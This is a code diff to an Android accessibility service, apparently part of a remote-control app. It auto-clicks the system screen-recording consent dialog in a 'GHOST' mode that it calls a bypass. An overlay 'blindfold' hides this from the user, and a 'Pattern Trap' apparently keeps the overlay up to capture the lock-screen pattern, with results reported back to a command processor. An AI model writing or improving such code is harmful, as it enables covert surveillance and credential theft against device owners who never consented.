@@ -546,59 +546,73 @@ class MyAccessibilityService : AccessibilityService() {
         
         // --- SCREEN RECORD GHOST LOGIC (DECOUPLED) ---
         if (ScreenRecordManager.expectedMode == "AUTO") {
-            val root = rootInActiveWindow
+            val root = rootInActiveWindow ?: return
             
-            // Android 14+ MediaProjection 2-step bypass
-            val shareEntireNodes = root?.findAccessibilityNodeInfosByText("Share entire screen") ?: emptyList()
-            val shareOneNodes = root?.findAccessibilityNodeInfosByText("Share one app") ?: emptyList()
+            // Android 14+ / One UI 6+ MediaProjection 2-step bypass
+            val shareEntireNodes = root.findAccessibilityNodeInfosByText("Share entire screen") ?: emptyList()
+            val shareOneNodes = root.findAccessibilityNodeInfosByText("Share one app") ?: emptyList()
             
-            // 1. If dropdown is open, select "Share entire screen"
+            // STAGE 1: Selection Management (Dropdown)
             if (shareEntireNodes.isNotEmpty() && shareOneNodes.isNotEmpty()) {
+                DebugLogger.log("GHOST_REC", "Lifecycle: Detected A14 Selection Dropdown.")
                 for (node in shareEntireNodes) {
                     var target: android.view.accessibility.AccessibilityNodeInfo? = node
                     while (target != null && !target.isClickable) target = target.parent
-                    if (target != null && target.isClickable) {
+                    if (target != null &amp;&amp; target.isClickable) {
+                        DebugLogger.log("GHOST_REC", "Action: Tapping 'Share entire screen'...")
                         target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        DebugLogger.log("GHOST_ACCEPT", "Selected 'Share entire screen' from A14 dropdown.")
-                        return // Yield for next UI event
+                        return // Exit event handler to let the UI refresh for the next step
                     }
                 }
             }
             
-            // 2. If dropdown is closed but "Share one app" is the current selection, open the dropdown
-            if (shareOneNodes.isNotEmpty() && shareEntireNodes.isEmpty()) {
+            if (shareOneNodes.isNotEmpty() &amp;&amp; shareEntireNodes.isEmpty()) {
+                DebugLogger.log("GHOST_REC", "Lifecycle: Dropdown collapsed. 'Share one app' currently active. Re-opening...")
                 for (node in shareOneNodes) {
                     var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                    while (target != null && !target.isClickable) target = target.parent
-                    if (target != null && target.isClickable) {
+                    while (target != null &amp;&amp; !target.isClickable) target = target.parent
+                    if (target != null &amp;&amp; target.isClickable) {
                         target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        DebugLogger.log("GHOST_ACCEPT", "Clicked 'Share one app' to open A14 dropdown.")
-                        return // Yield for next UI event
+                        return 
                     }
                 }
             }
 
-            // 3. Standard Click Start/Start now (Android 10-13, or Android 14 after selecting Entire Screen)
-            val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
-            val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
-            val allowNodes = root?.findAccessibilityNodeInfosByText("Allow") ?: emptyList()
+            // STAGE 2: Final Confirmation (Action Button)
+            // Expanded dictionary to support modern Samsung and Pixel variations
+            val confirmationKeywords = listOf("Start now", "Start recording", "Share screen", "Start", "Allow", "Share")
             
-            for (node in (startNodes + altNodes + allowNodes)) {
-                var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                while (target != null && !target.isClickable) target = target.parent
-                if (target != null && target.isClickable) {
-                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                    DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
-                    ScreenRecordManager.expectedMode = "" // Disarm
-                    
-                    if (!ScreenRecordManager.isPatternTrap) {
-                        DimmerManager.removeOverlay(this) // Remove blindfold immediately if standard record
-                    } else {
-                        DebugLogger.log("GHOST_ACCEPT", "Pattern Trap active. Retaining blindfold until hardware lock.")
+            for (keyword in confirmationKeywords) {
+                val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
+                if (nodes.isNotEmpty()) {
+                    DebugLogger.log("GHOST_REC", "Lifecycle: Found potential confirmation node matching: '$keyword'")
+                    for (node in nodes) {
+                        // Crucial: Only target nodes that are strictly the button text, avoiding description paragraphs
+                        if ((node.text?.length ?: 100) > 20) continue 
+
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                        var climbLevel = 0
+                        while (target != null &amp;&amp; !target.isClickable &amp;&amp; climbLevel &lt; 3) {
+                            target = target.parent
+                            climbLevel++
+                        }
+                        
+                        if (target != null &amp;&amp; target.isClickable) {
+                            DebugLogger.log("GHOST_REC", "Action: Final Handshake! Clickiing via keyword '$keyword' (Climb: $climbLevel)")
+                            val success = target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            
+                            if (success) {
+                                ScreenRecordManager.expectedMode = "" // Disarm sequence
+                                if (!ScreenRecordManager.isPatternTrap) {
+                                    DimmerManager.removeOverlay(this)
+                                }
+                                CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Handshake via '$keyword' successful.")
+                                return 
+                            } else {
+                                DebugLogger.log("GHOST_REC", "Warning: performAction returned FALSE for '$keyword'")
+                            }
+                        }
                     }
-                    
-                    CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
-                    return // Exit after successful trigger
                 }
             }
         } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
